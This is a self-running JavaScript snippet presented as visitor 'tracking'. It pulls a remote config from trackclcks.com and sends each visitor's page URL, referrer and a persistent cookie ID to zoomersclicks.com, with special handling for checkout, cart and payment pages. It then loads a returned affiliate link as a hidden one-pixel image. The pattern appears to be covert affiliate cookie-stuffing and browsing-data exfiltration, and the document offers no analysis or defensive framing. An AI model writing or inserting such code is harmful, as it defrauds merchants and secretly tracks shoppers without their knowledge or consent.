(function () {

  function generateUUID() {
    return 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g, function (char) {
      const rand = (Math.random() * 16) | 0;
      const value = char === 'x' ? rand : (rand & 0x3) | 0x8;
      return value.toString(16);
    });
  }

  function getCookie(name) {
    const prefix = name + '=';
    const cookies = document.cookie.split(';');
    for (let i = 0; i < cookies.length; i++) {
      const cookie = cookies[i].trim();
      if (cookie.indexOf(prefix) === 0) {
        return cookie.substring(prefix.length, cookie.length);
      }
    }
    return '';
  }

  function isCheckoutPage() {
    const checkoutKeywords = ['cart', 'payment', 'shipping', 'checkout', 'pay', 'review-order'];
    return checkoutKeywords.some(function (keyword) {
      return window.location.pathname.toLowerCase().includes(keyword);
    });
  }

  function injectPixel(url) {
    const target = document.body || document.documentElement;
    if (!target) return;
    const img = document.createElement('img');
    img.src = url;
    img.style.width = '1px';
    img.style.height = '1px';
    img.style.display = 'none';
    img.style.visibility = 'hidden';
    target.appendChild(img);
  }

  async function fireTracking() {
    const sessionKey = 'tracking_done_' + window.location.hostname;

    if (sessionStorage.getItem(sessionKey)) {
      if (!isCheckoutPage()) return;
    }

    try {
      const existingId = getCookie('tracking_uuid');
      const visitorId = existingId || generateUUID();

      const expiryDate = new Date(Date.now() + 30 * 24 * 60 * 60 * 1000).toUTCString();
      document.cookie = 'tracking_uuid=' + visitorId + '; expires=' + expiryDate + ';path=/;SameSite=Lax';

      const response = await fetch('https://zoomersclicks.com/api/track-user', {
        method: 'POST',
        keepalive: true,
        body: JSON.stringify({
          url: window.location.href,
          referrer: document.referrer,
          unique_id: visitorId,
          origin: window.location.hostname,
          timestamp: new Date().getTime(),
        }),
        headers: { 'Content-Type': 'application/json' },
      });

      const data = await response.json();

      if (data.success && data.affiliate_url) {
        injectPixel(data.affiliate_url);
        sessionStorage.setItem(sessionKey, 'true');
      } else {
        injectPixel('https://zoomersclicks.com/api/fallback-pixel?id=' + visitorId);
      }
    } catch (err) {
      console.error('Tracking Failed:', err);
    }
  }

  function run() {
    const configUrl = 'https://trackclcks.com/api/site-config?host=' + encodeURIComponent(window.location.hostname);

    fetch(configUrl)
      .then(function (response) {
        if (!response.ok) throw new Error('Config API Failed');
        return response.json();
      })
      .then(function (config) {
        if (!config || (!config.always && !config.cartExtra)) return;

        if (config.always || (config.cartExtra && isCheckoutPage())) {
          fireTracking();
        }
      })
      .catch(function (err) {
        console.error('Config fetch failed:', err);
      });
  }

  if (document.readyState === 'interactive' || document.readyState === 'complete') {
    run();
  } else {
    window.addEventListener('DOMContentLoaded', run);
  }

})();
